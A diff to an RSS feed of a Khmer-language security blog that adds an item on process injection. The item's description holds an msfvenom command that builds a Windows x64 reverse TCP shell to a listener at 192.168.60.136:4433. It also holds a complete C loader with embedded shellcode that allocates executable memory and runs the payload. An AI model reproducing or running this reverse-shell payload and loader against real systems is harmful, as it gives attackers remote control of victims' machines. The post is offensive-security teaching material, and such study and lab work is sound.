@@ -14,7 +14,7 @@
     <managingEditor>thiklife403@gmail.com (Thik)</managingEditor>
     <webMaster>thiklife403@gmail.com (Thik)</webMaster>
     <copyright><a rel='license' target='_blank' href='http://creativecommons.org/licenses/by-sa/4.0/'><img alt='Creative Commons License' style='border-width:0;display:block;margin-left:auto;margin-right:auto;' src='https://i.creativecommons.org/l/by-sa/4.0/88x31.png' /></a>©2020 - 2023 All content is licensed under <a rel='license' target='_blank' href='http://creativecommons.org/licenses/by-sa/4.0/'>CC BY-SA</a>.</copyright>
-    <lastBuildDate>Tue, 06 Dec 2022 22:01:06 +0700</lastBuildDate>
+    <lastBuildDate>Wed, 21 Jun 2023 21:01:06 +0700</lastBuildDate>
     
         <atom:link href="https://thiklab.com/en/index.xml" rel="self" type="application/rss+xml" />
     
@@ -40,6 +40,52 @@
         
       
 
+      
+      <item>
+        <title>Process Injection without Write/Execute Permission</title>
+        <link>https://thiklab.com/en/posts/process-injection-without-write-exec-permission/</link>
+        <pubDate>Wed, 21 Jun 2023 21:01:06 +0700</pubDate>
+        <author>thiklife403@gmail.com (Thik)</author>
+        <atom:modified>Wed, 21 Jun 2023 21:01:06 +0700</atom:modified>
+        <guid>https://thiklab.com/en/posts/process-injection-without-write-exec-permission/</guid>
+        <description>Self-Injection Payload ខាងក្រោមជាដំណើរការបង្កើត Payload ដោយប្រើប្រាស់ Shellcode ជាភាសារ C គោលដៅលើម៉ាស៊ីន 64 bit ។
+1  msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.60.136 lport=4433 -f c   បន្ទាប់មកយើងនឹងសាកល្បង Compile Payload ធម្មតាដោយប្រើប្រាស់វិធីសាស្ត្រ Process Injection តាមបែប Slef-Injection ដោយផ្ដល់សិទ្ធតាមលំនាំដើម Read, Write និង Execute ។
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  #include &amp;lt;stdio.h&amp;gt;#include &amp;lt;Windows.h&amp;gt; int main() { unsigned char shellcode[] = &amp;#34;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50&amp;#34; &amp;#34;\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52&amp;#34; &amp;#34;\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a&amp;#34; &amp;#34;\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41&amp;#34; &amp;#34;\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0&amp;#34; &amp;#34;\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01&amp;#34; &amp;#34;\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41&amp;#34; &amp;#34;\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d&amp;#34; &amp;#34;\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48&amp;#34; &amp;#34;\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff&amp;#34; &amp;#34;\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5&amp;#34; &amp;#34;\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb&amp;#34; &amp;#34;\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5&amp;#34;; void* exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE); memcpy(exec, shellcode, sizeof shellcode); ((void(*)())exec)(); return 0; }   ដើម្បី Compile យើងអាចប្រើប្រាស់កម្មវិធីផ្សេងៗជាច្រើន តែសម្រាប់ខ្ញុំៗប្រើប្រាស់ Embarcadero Dev-C++ ដើម្បីដំណើរការបង្កើត ។</description>
+        
+        <dc:creator>thik</dc:creator>
+        <media:content url="https://thiklab.comimages/feature2/article-1.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        
+        
+          
+            
+              <category>reverse-shell</category>
+            
+          
+            
+              <category>c-shellcode</category>
+            
+          
+        
+        
+          
+            
+              <category>Process Injection</category>
+            
+          
+            
+              <category>Metasploit</category>
+            
+          
+        
+        
+          
+            
+              <category>WinExE</category>
+            
+          
+        
+      </item>
       
       <item>
         <title>CobaltStrike Over WAN Connection</title>
